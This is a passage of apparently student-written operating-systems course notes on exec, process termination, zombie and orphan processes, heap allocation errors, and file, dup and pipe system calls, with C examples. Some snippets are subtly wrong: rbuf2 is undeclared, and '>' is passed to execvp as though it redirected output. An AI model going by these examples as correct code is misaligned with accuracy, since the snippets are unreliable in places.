<li>The <code>fork</code> system call creates a copy of the calling process (child inherits all the properties of its parent).</li>
<li>However, many applications require the child process to <font color="f54747">executes code different from the parent’s</font>.</li>
<li>Therefore, executes <code>exec</code> family system calls to overlay the calling process with a new executable module.</li>
</ul>
</li>
<li><p>Working Process:</p>
<ul>
<li><code>exec</code> will load a new executable into the process image, copies the arguments into the process and calls <code>main(args, argy)</code>.</li>
<li>If succeed, <font color="f54747"><code>exec</code> never returns</font>. The calling process is completely overlaid by the new program.</li>
<li>The <code>fork-exec</code> combination can <font color="f54747">let the child execute the new program</font> while the parent continues to execute the original code.</li>
</ul>
</li>
<li><p>Variations of <code>exec</code> system call:</p>
<ul>
<li><p><code>execl</code> calls (<code>execl</code>, <code>execlp</code>, <code>execle</code>)</p>
<ul>
<li>pass the command-line arguments as <font color="f54747">a list of pointers</font>.</li>
</ul>
</li>
<li><p><code>execv</code> calls (<code>execv</code>, <code>execvp</code>, <code>execve</code>)</p>
<ul>
<li>pass the command-line arguments in <font color="f54747">an argument array</font>, which is an array of pointers <font color="7B3279">to null-terminated</font> strings (ie. must be terminated by a NULL pointer).</li>
</ul>
</li>
</ul>
</li>
<li><p>Example:</p>
  <figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* 8-myexecl */</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span>&#123;</span><br><span class="line">    <span class="type">pid_t</span> childpid;</span><br><span class="line">    <span class="type">int</span> status;</span><br><span class="line">    </span><br><span class="line">    <span class="type">char</span> *cmd = <span class="string">&quot;ls&quot;</span>;</span><br><span class="line">    <span class="type">char</span> *argv[<span class="number">2</span>];</span><br><span class="line">    argv[<span class="number">0</span>] = <span class="string">&quot;ls&quot;</span>;</span><br><span class="line">    argv[<span class="number">1</span>] = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>, wait(&amp;status));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// create a child to execute new program</span></span><br><span class="line">    <span class="keyword">if</span> ((childpid = fork()) == <span class="number">-1</span>)&#123; </span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Error: fork()\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>(childpid == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="comment">/* child code (childpid for child is 0) */</span></span><br><span class="line">        <span class="keyword">if</span> (execvp(cmd, argv) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;Error: execvp()\n&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>(childpid != wait(&amp;status))&#123;   </span><br><span class="line">        <span class="comment">/* parent code */</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Error: wait()&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    Results: print the list</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure></li>
</ul>
<h2 id="Process-Termination"><a href="#Process-Termination" class="headerlink" title="Process Termination"></a>Process Termination</h2><h3 id="Two-Terminations"><a href="#Two-Terminations" class="headerlink" title="Two Terminations"></a>Two Terminations</h3><ol>
<li><p><strong>Normal Process Termination</strong></p>
<ul>
<li>A process terminates normally when,<ol>
<li>a <code>return</code> from <code>main</code></li>
<li>an implicit return from main</li>
<li>a call to the <code>_exit</code> system call</li>
<li>a call to the C function <code>exit</code></li>
</ol>
</li>
</ul>
</li>
<li><p><strong>Abnormal Process Termination</strong></p>
<ul>
<li>A process terminates abnormally when,<ol>
<li>calling <code>abort</code>, causing the SIGABRT signal to be sent to the calling process.</li>
<li>processing a signal that causes termination.</li>
</ol>
</li>
<li>User-installed exit handler will not be called upon abnormal termination.</li>
</ul>
</li>
</ol>
<h3 id="Orphan-Process"><a href="#Orphan-Process" class="headerlink" title="Orphan Process"></a>Orphan Process</h3><ul>
<li><p>it occurs if when the child still executing but its parent has terminated.</p>
  <figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* 9-orphan */</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">pid_t</span> childpid;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>((childpid = fork()) == <span class="number">-1</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Error in the fork&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line">    &#125;<span class="keyword">else</span>  <span class="keyword">if</span>(childpid == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="comment">/*child code*/</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Before: I am the child (PID - %d, PPID -%d)\n&quot;</span>, getpid(), getppid());</span><br><span class="line">        sleep(<span class="number">10</span>);      <span class="comment">// the child has not been terminated</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Before: I am the child (PID - %d, PPID -%d)\n&quot;</span>, getpid(), getppid());</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="comment">/* parent code */</span></span><br><span class="line">        sleep(<span class="number">1</span>);       <span class="comment">// the parent is terminated</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;I am the parent (PID - %d, PPID -%d)\n&quot;</span>, getpid(), getppid());</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="Zombie-Process"><a href="#Zombie-Process" class="headerlink" title="Zombie Process"></a>Zombie Process</h3><ul>
<li><p>it occurs if the parent of the terminating process is not currently executing a <code>wait()</code>.</p>
</li>
<li><p>Noted: <font color="f54747">the zombie process is not an orphan process</font>.</p>
  <figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* 9-1-zombie */</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span>&#123;</span><br><span class="line">    <span class="type">pid_t</span> childpid;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ((childpid = fork()) == <span class="number">-1</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Error in the fork&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span>  <span class="keyword">if</span> (childpid == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="comment">/*child code*/</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Before: I am the child (PID - %d, PPID -%d)\n&quot;</span>, getpid(), getppid());</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="comment">/* parent code */</span></span><br><span class="line">        sleep(<span class="number">100</span>);     <span class="comment">// child process is terminated but parent does not</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;I am the parent (PID - %d, PPID - %d)\n&quot;</span>, getpid(), getppid());</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    ls -l</span></span><br><span class="line"><span class="comment">        UID   PID  PPID  S</span></span><br><span class="line"><span class="comment">        501  4276  4275  Z+      // this is the zombie process</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure></li>
</ul>
]]></content>
      <categories>
        <category>CSCI3150</category>
      </categories>
  </entry>
  <entry>
    <title>CSCI3150 - System Call (Memory)</title>
    <url>/myBlog/2022/09/18/2022/CSCI3150/2022-9-17-CSCI3150-SystemCall-Memory/</url>
    <content><![CDATA[<h2 id="Memory-Allocation"><a href="#Memory-Allocation" class="headerlink" title="Memory Allocation"></a>Memory Allocation</h2><h3 id="Memory-API-malloc"><a href="#Memory-API-malloc" class="headerlink" title="Memory API malloc"></a>Memory API <code>malloc</code></h3><ul>
<li><p>Description:</p>
<ul>
<li>Allocate a memory region on the <font color="7B3279">heap</font>.</li>
</ul>
</li>
<li><p>Syntax: <code>void* malloc(size_t size)</code></p>
<ul>
<li><code>size_t size</code>: the size of the memory block (in bytes)</li>
<li><code>size_t</code>: is an unsigned integer type</li>
</ul>
</li>
<li><p>Return:</p>
<ul>
<li>Success: a void type pointer to the memory block allocated by <code>malloc</code></li>
<li>Fail: a null pointer</li>
</ul>
</li>
</ul>
<h3 id="Function-sizeof"><a href="#Function-sizeof" class="headerlink" title="Function sizeof"></a>Function <code>sizeof</code></h3><ul>
<li>Description:<ul>
<li><p>Usually use <code>size</code> in <code>malloc</code> instead of typing a number.</p>
</li>
<li><p>Two types of results of <code>sizeof</code></p>
  <figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* The actual size of &#x27;x&#x27; is known at run-time */</span></span><br><span class="line"><span class="type">int</span> *x = <span class="built_in">malloc</span>(<span class="number">10</span> * <span class="keyword">sizeof</span>(<span class="type">int</span>));</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, <span class="keyword">sizeof</span>(x))       <span class="comment">// 4 (size of a pointer)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/* The actual size of &#x27;y&#x27; is known at compile-time */</span></span><br><span class="line"><span class="type">int</span> y[<span class="number">10</span>]</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, <span class="keyword">sizeof</span>(y))       <span class="comment">// 40 (y is static)</span></span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ul>
<h3 id="Memory-API-free"><a href="#Memory-API-free" class="headerlink" title="Memory API free"></a>Memory API <code>free</code></h3><ul>
<li><p>Description:</p>
<ul>
<li>To free a memory region allocated by a call to <code>malloc</code>.</li>
</ul>
</li>
<li><p>Syntax: <code>void free(void *ptr)</code></p>
<ul>
<li><code>void *ptr</code> is a pointer to a memory block allocated with <code>malloc</code></li>
</ul>
</li>
<li><p>Return <code>none</code></p>
</li>
</ul>
<h3 id="Memory-API-calloc"><a href="#Memory-API-calloc" class="headerlink" title="Memory API calloc"></a>Memory API <code>calloc</code></h3><ul>
<li><p>Description:</p>
<ul>
<li>Allocate memory on the <font color="7B3279">heap</font> and set with <font color="7B3279">zero</font> before returning.</li>
</ul>
</li>
<li><p>Syntax: <code>void* calloc(size_t num, size_t size)</code></p>
<ul>
<li><code>size_t num</code>: number of block to allocate</li>
<li><code>size_t size</code>: size of each block (in bytes)</li>
</ul>
</li>
<li><p>Return:</p>
<ul>
<li>Success: a void type pointer to memory block allocated by <code>calloc</code></li>
<li>Fail: a null pointer</li>
</ul>
</li>
</ul>
<h3 id="Memory-API-realloc"><a href="#Memory-API-realloc" class="headerlink" title="Memory API realloc"></a>Memory API <code>realloc</code></h3><ul>
<li><p>Description:</p>
<ul>
<li>Change the size of memory block.</li>
</ul>
</li>
<li><p>Syntax: <code>void* realloc(void *ptr, size_t size)</code></p>
<ul>
<li><code>void *ptr</code>: pointer to memory block allocated with <code>malloc</code>, <code>calloc</code> or <code>realloc</code></li>
<li><code>size_t size</code>: new size for the memory block (in bytes)</li>
</ul>
</li>
<li><p>Return:</p>
<ul>
<li>Success: a void type pointer to memory block</li>
<li>Fail: a null pointer</li>
</ul>
</li>
</ul>
<h2 id="Common-Error"><a href="#Common-Error" class="headerlink" title="Common Error"></a>Common Error</h2><h3 id="Forget-To-Allocate-Memory"><a href="#Forget-To-Allocate-Memory" class="headerlink" title="Forget To Allocate Memory"></a>Forget To Allocate Memory</h3><ul>
<li><p>Description:</p>
<ul>
<li>created a pointer but forgot to allocate the memory</li>
<li>if operating (e.g. <code>strcpy</code>) that pointer, then it reports an error</li>
</ul>
</li>
<li><p>Incorrect Code (Error):</p>
  <figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Incorrect Code */</span></span><br><span class="line"><span class="type">char</span> *src = <span class="string">&quot;hello&quot;</span>;    <span class="comment">// character string constant</span></span><br><span class="line"><span class="type">char</span> *dst;              <span class="comment">// unallocated</span></span><br><span class="line"><span class="built_in">strcpy</span>(dst, src);       <span class="comment">// segfault and die</span></span><br></pre></td></tr></table></figure>
  <img src="https://p.ipic.vip/5lvhn0.png" height="250px">

</li>
<li><p>Correct Code:</p>
  <figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">char</span> *src = <span class="string">&quot;hello&quot;</span>;</span><br><span class="line"><span class="type">char</span> *dst = <span class="built_in">malloc</span>(<span class="built_in">strlen</span>(src) + <span class="number">1</span>);    <span class="comment">// allocated</span></span><br><span class="line"><span class="built_in">strcpy</span>(dst, src);</span><br></pre></td></tr></table></figure>
  <img src="https://p.ipic.vip/4vepuz.png" height="250px"></li>
</ul>
<h3 id="Allocated-Small-Memory"><a href="#Allocated-Small-Memory" class="headerlink" title="Allocated Small Memory"></a>Allocated Small Memory</h3><ul>
<li><p>Description:</p>
<ul>
<li>do not allocate the pointer with enough memory</li>
<li>it works properly</li>
</ul>
</li>
<li><p>Incorrect Code (but work properly):</p>
  <figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">char</span> *src = <span class="string">&quot;hello&quot;</span>;</span><br><span class="line"><span class="type">char</span> *dst = <span class="built_in">malloc</span>(<span class="built_in">strlen</span>(src));    <span class="comment">// too small</span></span><br><span class="line"><span class="built_in">strcpy</span>(dst, src);</span><br></pre></td></tr></table></figure>
  <img src="https://p.ipic.vip/tirikq.png" height="250px"></li>
</ul>
<h3 id="Forget-to-Initialize"><a href="#Forget-to-Initialize" class="headerlink" title="Forget to Initialize"></a>Forget to Initialize</h3><ul>
<li><p>Description:</p>
<ul>
<li>use an uninitialized the pointer</li>
<li>it will <font colro="f54747">allocate with the value used before</font></li>
</ul>
</li>
<li><p>Incorrect Code:</p>
  <figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> *x = (<span class="type">int</span> *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="type">int</span>));   <span class="comment">// allocated</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;*x = %d\n&quot;</span>, *x);               <span class="comment">// uninitialized memory access</span></span><br></pre></td></tr></table></figure>
  <img src="https://p.ipic.vip/ue92hb.png" height="250px"></li>
</ul>
<h3 id="Memory-Leak"><a href="#Memory-Leak" class="headerlink" title="Memory Leak"></a>Memory Leak</h3><ul>
<li>Description:<ul>
<li>do not <code>free</code> the used memory access</li>
<li>the program will run out of memory  <img src="https://p.ipic.vip/kkfjbf.png" height="250px"></li>
</ul>
</li>
</ul>
<h3 id="Dangling-Pointer-迷途指針"><a href="#Dangling-Pointer-迷途指針" class="headerlink" title="Dangling Pointer 迷途指針"></a>Dangling Pointer 迷途指針</h3><ul>
<li>Description:<ul>
<li>freeing the memory before it is finished using</li>
<li>the program accesses to that memory with invalid pointer  <img src="https://p.ipic.vip/13k2pf.png" height="250px"></li>
</ul>
</li>
</ul>
<h3 id="Double-Free"><a href="#Double-Free" class="headerlink" title="Double Free"></a>Double Free</h3><ul>
<li>Description:<ul>
<li>Free the memory that was freed before</li>
<li>it reports an undefined error  <img src="https://p.ipic.vip/70g8sl.png" height="150px"></li>
</ul>
</li>
</ul>
]]></content>
      <categories>
        <category>CSCI3150</category>
      </categories>
  </entry>
  <entry>
    <title>CSCI3150 - System Call (File &amp; Directory)</title>
    <url>/myBlog/2022/09/20/2022/CSCI3150/2022-9-20-CSCI3150-SystemCall-F&amp;D/</url>
    <content><![CDATA[<h2 id="File-amp-Directory"><a href="#File-amp-Directory" class="headerlink" title="File &amp; Directory"></a>File &amp; Directory</h2><ol>
<li><p>File</p>
<ul>
<li>A container to contain data of a file (provides a linear space so that stores the data linearly).</li>
<li>Each file has a low-level name (<font color="f54747">inode number</font>).</li>
</ul>
</li>
<li><p>Directory</p>
<ul>
<li>An implement directory tree (directory hierarchy).</li>
<li>It also has a low level name.</li>
<li>It contains a list of file name and inode number pair.</li>
</ul>
</li>
</ol>
<h2 id="File-Operations"><a href="#File-Operations" class="headerlink" title="File Operations"></a>File Operations</h2><h3 id="open-System-Call"><a href="#open-System-Call" class="headerlink" title="open System Call"></a><code>open</code> System Call</h3><ul>
<li><p>Syntax: <code>int open(const char *pathname, int oflags);</code></p>
<ul>
<li><code>O_RDONLY</code>: Read only</li>
<li><code>O_WRONLY</code>: Write only</li>
<li><code>O_RDWR</code>: Read and write.</li>
<li><code>O_CREAT</code>: If the pathname does not exist, create it as a regular file.</li>
<li><code>O_TRUNC</code>: If the file already exists and is a regular file and the access mode allows writing, it will be truncated to length 0.</li>
</ul>
</li>
<li><p>Return:</p>
<ul>
<li><font color="f54747">file descriptor</font> which is an integer to access files.</li>
</ul>
</li>
</ul>
<h3 id="open-Process"><a href="#open-Process" class="headerlink" title="open Process"></a><code>open</code> Process</h3><ul>
<li><p>After executing <code>open</code> system call, it undergoes:</p>
<ol>
<li>The file descriptor specifies the index into File Descriptor Table (FDT) of the process.</li>
<li>The entries of FDT contain pointers to entries in the System File Table (SFT).</li>
<li>When a file is opened, an entry is created in both FDT and SFT.</li>
<li>SFT entry contains information about whether a file is open for read, write, protection, or lock and the file offset.</li>
</ol>
  <img src="https://p.ipic.vip/h8cq11.png" width="400px">
  </li>
<li><p>The file descriptor for the created file is <code>3</code>.</p>
</li>
<li><p>Because when a process is created, file descriptor <code>0</code>, <code>1</code>, <code>2</code> are opened by the default for standard input, output and error.</p>
</li>
</ul>
<h3 id="read-System-Call"><a href="#read-System-Call" class="headerlink" title="read System Call"></a><code>read</code> System Call</h3><ul>
<li><p>Syntax: <code>ssize_t read(int fd, void *buf, size_t count);</code></p>
<ul>
<li><code>fd</code>: file descriptor</li>
<li><code>buf</code>: buffer pointer</li>
<li><code>count</code>: the number of bytes to write to</li>
</ul>
</li>
<li><p>Return:</p>
<ul>
<li>the number of bytes it read.</li>
</ul>
</li>
</ul>
<h3 id="write-System-Call"><a href="#write-System-Call" class="headerlink" title="write System Call"></a><code>write</code> System Call</h3><ul>
<li><p>Syntax: <code>ssize_t write(int fd, const *buf, size_t count);</code></p>
<ul>
<li><code>fd</code>: file descriptor</li>
<li><code>buf</code>: buffer pointer</li>
<li><code>count</code>: the number of bytes to write to</li>
</ul>
</li>
<li><p>Return:</p>
<ul>
<li>the number of bytes it write.</li>
</ul>
</li>
</ul>
<h3 id="lseek-System-Call"><a href="#lseek-System-Call" class="headerlink" title="lseek System Call"></a><code>lseek</code> System Call</h3><ul>
<li><p>Description:</p>
<ul>
<li>An open file has a <font color="f54747">current offset</font> to determine where the next read or write will begin reading from or writing to within the file.</li>
<li><code>lseek</code> is used to update the current offset explicitly.</li>
</ul>
</li>
<li><p>Syntax: <code>off_t lseek(int fd, off_t offset, int whence);</code></p>
<ul>
<li><code>fd</code>: file descriptor</li>
<li><code>offset</code>: position the file offset to particular location within the file</li>
<li><code>whence</code>: determine how the seek is performed<ul>
<li><code>SEEK_SET</code>: the offset is set to offset bytes (offset)</li>
<li><code>SEEK_CUR</code>: the offset is set to offset bytes + its current location (offset + current)</li>
<li><code>SEEK_END</code>: the offset is set to offset bytes + the size of the file (offset + the end)</li>
</ul>
</li>
</ul>
</li>
</ul>
<h3 id="Examples"><a href="#Examples" class="headerlink" title="Examples"></a>Examples</h3><ol>
<li>File Operations: <figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">char</span> buf[<span class="number">20</span>] = <span class="string">&quot;Hello World!&quot;</span>;</span><br><span class="line"><span class="type">char</span> rbuf1[<span class="number">20</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">// open or create &quot;myfile&quot;</span></span><br><span class="line"><span class="type">int</span> fd = open(<span class="string">&quot;myfile&quot;</span>, O_CREAT | O_TRUNC | O_RDWR, S_IRUSR | S_IWUSR );</span><br><span class="line"></span><br><span class="line">write(fd, buf, <span class="number">20</span>);         <span class="comment">// write buf into fd</span></span><br><span class="line">lseek(fd, <span class="number">0</span>, SEEK_SET);     <span class="comment">// update the offset to the start</span></span><br><span class="line">read(fd, rbuf1, <span class="number">20</span>);        <span class="comment">// read the content in fd (buf) and store into rbuf1</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, rbuf1);      <span class="comment">// Hello World!</span></span><br><span class="line"></span><br><span class="line">lseek(fd, <span class="number">6</span>, SEEK_SET);     <span class="comment">// update the offset to the start + 6</span></span><br><span class="line">read(fd, rbuf2, <span class="number">20</span>);        <span class="comment">// read the content and store into rbuf2</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, rbuf2);      <span class="comment">// World!</span></span><br></pre></td></tr></table></figure></li>
</ol>
<h2 id="I-x2F-O-Redirection"><a href="#I-x2F-O-Redirection" class="headerlink" title="I&#x2F;O Redirection"></a>I&#x2F;O Redirection</h2><h3 id="Redirection"><a href="#Redirection" class="headerlink" title="Redirection"></a>Redirection</h3><ol>
<li><p>Redirection</p>
<ul>
<li>it means that the process modifies its File Descriptor Table (FDT) entry so that it points to a different entry in the System File Table (SFT).</li>
</ul>
</li>
<li><p>Example</p>
<ul>
<li>The command <code>cat</code> reads from a file and echoes to <font color="f54747">standard output</font></li>
<li>Suppose the <code>myfile</code> contains “Hello World” content, <code>ls -l &gt; myfile</code> command redirects standard output to <code>myfile</code>:  <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cat</span> myfile      <span class="comment"># output: Hello World</span></span><br><span class="line"><span class="built_in">ls</span> -l &gt; myfile</span><br><span class="line"><span class="built_in">cat</span> myfile      <span class="comment"># execute ls -l</span></span><br></pre></td></tr></table></figure></li>
<li>Coding  <figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* 6-2-redirection-exec */</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">main()&#123;</span><br><span class="line">    <span class="type">char</span> *cmd = <span class="string">&quot;ls&quot;</span>;</span><br><span class="line">    <span class="type">char</span> *argv[<span class="number">5</span>];</span><br><span class="line">    argv[<span class="number">0</span>] = <span class="string">&quot;ls&quot;</span>;</span><br><span class="line">    argv[<span class="number">1</span>] = <span class="string">&quot;-l&quot;</span>;</span><br><span class="line">    argv[<span class="number">2</span>] = <span class="string">&quot;&gt;&quot;</span>;</span><br><span class="line">    argv[<span class="number">3</span>] = <span class="string">&quot;myfile&quot;</span>;</span><br><span class="line">    argv[<span class="number">4</span>] = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    execvp(cmd, argv);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ol>
<h3 id="dup-System-Call"><a href="#dup-System-Call" class="headerlink" title="dup System Call"></a><code>dup</code> System Call</h3><ul>
<li><p>Description:<br>  <code>dup</code> is a smart function that can duplicate (copy) the file descriptor <code>fd</code> to the lowest-numbered unused file descriptor in the File Descriptor Table (FDT).</p>
</li>
<li><p>Syntax: <code>int dup(int fd)</code></p>
<ul>
<li><code>fd</code>: file descriptor</li>
</ul>
</li>
<li><p>Return:</p>
<ul>
<li>Success, return a new file descriptor</li>
<li>Error, return <code>-1</code></li>
</ul>
</li>
<li><p>Example:</p>
<ul>
<li>Redirects standard output  <figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* 6-redirection */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">char</span> *cmd;</span><br><span class="line">    <span class="type">char</span> *argv[<span class="number">3</span>];</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> fd = open(<span class="string">&quot;myfile&quot;</span>, O_CREAT |O_TRUNC |O_RDWR, S_IRUSR| S_IWUSR );</span><br><span class="line">    close(<span class="number">1</span>);		<span class="comment">// Close the stdout</span></span><br><span class="line">    dup(fd);		<span class="comment">// Duplicate fd</span></span><br><span class="line">    close(fd);</span><br><span class="line"></span><br><span class="line">    cmd = <span class="string">&quot;ls&quot;</span>;</span><br><span class="line">    argv[<span class="number">0</span>] = <span class="string">&quot;ls&quot;</span>;    </span><br><span class="line">    argv[<span class="number">1</span>] = <span class="string">&quot;-l&quot;</span>;     </span><br><span class="line">    argv[<span class="number">2</span>] = <span class="literal">NULL</span>;</span><br><span class="line">    execvp(cmd, argv); </span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
  <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cat</span> myfile      <span class="comment"># execute ls -l</span></span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ul>
<h2 id="Processes-Communication"><a href="#Processes-Communication" class="headerlink" title="Processes Communication"></a>Processes Communication</h2><h3 id="pipe-System-Call"><a href="#pipe-System-Call" class="headerlink" title="pipe System Call"></a><code>pipe</code> System Call</h3><ul>
<li><p>Description:</p>
<ul>
<li>Pipes provide a <font color="f54747">unidirectional</font> interprocess communication channel.</li>
<li>A pipe has a <font color="7B3279">read end</font> and a <font color="7B3279">write end</font>.<ul>
<li>Data is written to the write end of a pipe can be read from the read end of the pipe.</li>
<li>If a process attempts to read from an <font color="7B3279">empty pipe</font>, then <code>read()</code> will block until the data is available.</li>
</ul>
</li>
</ul>
</li>
<li><p>Situations:</p>
<ul>
<li>If all file descriptors referring to the <font color="f54747">write end of a pipe have been closed</font>, then an attempt to <code>read()</code> from the pipe will see end-of-file.</li>
<li>If all file descriptors referring to the <font color="f54747">read end of a pipe have been closed</font>, then a <code>write()</code> will cause a SIGPIPE signal to be generated for all the calling process.<ul>
<li>If the calling process is ignoring the signal, then <code>write()</code> fails with the error EPIPE.</li>
</ul>
</li>
</ul>
</li>
<li><p>Syntax: <code>int pipe(int* fd);</code></p>
<ul>
